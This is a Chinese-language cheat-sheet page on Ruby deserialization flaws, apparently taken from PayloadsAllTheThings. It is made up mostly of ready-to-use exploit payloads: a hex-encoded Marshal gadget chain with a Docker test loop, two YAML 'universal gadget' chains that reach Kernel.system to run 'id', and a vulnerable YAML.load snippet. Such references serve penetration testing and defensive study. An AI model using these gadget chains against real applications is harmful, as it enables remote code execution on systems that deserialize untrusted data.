# Ruby Deserialization - Ruby反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Ruby Deserialization 反序列化 Marshal YAML
攻击类型: Remote Code Execution Object Injection Gadget Chain
关键词: Ruby Marshal YAML.load deserialize gadget chain
技术: Marshal.load YAML.load Universal Gadget Chain RCE
版本: Ruby 2.x Ruby 3.x

[CONTENT]

## Ruby反序列化概述

Ruby反序列化是将序列化数据转换回Ruby对象的过程，常用格式包括YAML、Marshal和JSON。Ruby的Marshal模块常用于序列化和反序列化复杂Ruby对象，若处理不可信数据可能导致RCE。

## Marshal反序列化

适用于Ruby 2.0到2.5版本的Gadget Chain验证：

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

## YAML反序列化

### 漏洞代码示例

```ruby
require "yaml"
YAML.load(File.read("p.yml"))
```

### Universal Gadget (Ruby <= 2.7.2)

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

### Universal Gadget (Ruby 2.x - 3.x)

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Ruby.md